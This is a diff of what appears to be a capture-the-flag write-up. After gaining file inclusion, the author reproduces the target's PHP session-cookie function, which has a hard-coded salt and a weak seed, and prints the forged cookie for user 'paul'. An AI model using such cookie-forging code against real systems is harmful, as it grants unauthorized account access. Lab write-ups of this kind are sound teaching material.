@@ -47,12 +47,22 @@ published: true
 
 <img src="https://i.ibb.co/G7KQwy8/7.png" alt="7" border="0">
 
-<p>So now we got LFI and now you can see how the cookie works, now let`s get our first door opened and generate cookie for our entrance</p>
+<p>So now we got LFI , let`s start enumeration and see the source code</p>
 <br>
-<pre><span class="line">function makesession($username) {</span><br><span class="line"></span><br><span class="line">$max = strlen($username) - 1;</span><br><span class="line"></span><br><span class="line">$seed = rand(0, $max);</span><br><span class="line"></span><br><span class="line">$key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";</span><br><span class="line"></span><br><span class="line">$session_cookie = $username.md5($key);</span><br><span class="line"></span><br><span class="line">return $session_cookie;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">echo makesession("paul");</span>><br></pre>
 
-<p>That code will get 
+<img src="https://i.ibb.co/KqTmg1h/paul.png" alt="paul" border="0">
+
+<p>So after seeing files.php, we should get paul session to login</p>
+<p>Let`s countinue our enumeration</p>
+
+
+<pre><span class="line">function makesession($username) {</span><br><span class="line"></span><br><span class="line">$max = strlen($username) - 1;</span><br><span class="line"></span><br><span class="line">$seed = rand(0, $max);</span><br><span class="line"></span><br><span class="line">$key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";</span><br><span class="line"></span><br><span class="line">$session_cookie = $username.md5($key);</span><br><span class="line"></span><br><span class="line">return $session_cookie;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">echo makesession("paul");</span>><br></pre>
 <pre><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre>
+
+<p>Now we got our cookie</p>
+<p>after adding the cookie i didn`t login, there is something wrong, let`s check the login file</p>
+
+
 
 
 
